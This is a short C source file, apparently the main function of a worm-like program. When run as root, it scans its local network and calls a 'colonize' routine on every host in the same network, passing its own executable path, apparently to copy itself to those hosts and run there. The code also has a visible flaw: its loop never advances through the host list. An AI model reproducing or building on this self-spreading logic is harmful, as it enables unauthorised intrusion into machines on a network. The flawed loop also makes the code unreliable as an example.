#include "../include/main.h"

int main (int argc, char **argv) {
	char *dir_name = NULL;
	char *source_host_ip = NULL;
	char *mask_network = NULL;
	char *control_file = NULL;
	char *command_file = NULL;
	int i = 0;
	char program[PATH_MAX];
	struct in_addr *hostList = NULL;
	struct in_addr srcHost;

	realpath(argv[0], program);
	dir_name = dirname(argv[0]);
	chdir(dir_name);

	if (isRoot()) {
		source_host_ip = (char *) malloc(sizeof(char) * IP_LEN);
		mask_network = (char *) malloc(sizeof(char) * IP_LEN);

		if (source_host_ip == NULL || mask_network == NULL)
			return EXIT_FAILURE;

		if(isSourceHost(source_host_ip, mask_network)) {
			control_file = GetConfigControl();
			command_file = GetConfigCommand();
			hostList = scanNetwork(source_host_ip, mask_network);
			inet_aton(source_host_ip, &srcHost);

			while (1) {
				if (inet_netof(hostList[i]) == inet_netof(srcHost)) {
					colonize(inet_ntoa(hostList[i]), program);
				}
			}
		}
		free(source_host_ip);
		free(mask_network);
	}

	return EXIT_SUCCESS;
}
